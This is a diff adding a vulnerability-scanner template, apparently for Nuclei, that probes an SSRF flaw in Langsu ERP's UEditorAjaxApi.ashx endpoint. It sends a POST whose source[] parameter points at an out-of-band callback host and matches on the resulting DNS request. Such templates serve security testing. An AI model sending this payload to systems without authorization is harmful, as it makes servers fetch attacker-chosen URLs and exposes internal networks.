@@ -1,0 +1,25 @@
+id: poc-yaml-lserp-ueditorajaxapi-ashx-ssrf
+info:
+  name: Langsu ERP UEditorAjaxApi.ashx SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,dns
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/Api/UEditor/UEditorAjaxApi.ashx?method=catchimage"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=utf-8
+    body: source[]=http://{{interactsh-url}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "source\\[\\]=http://.*"
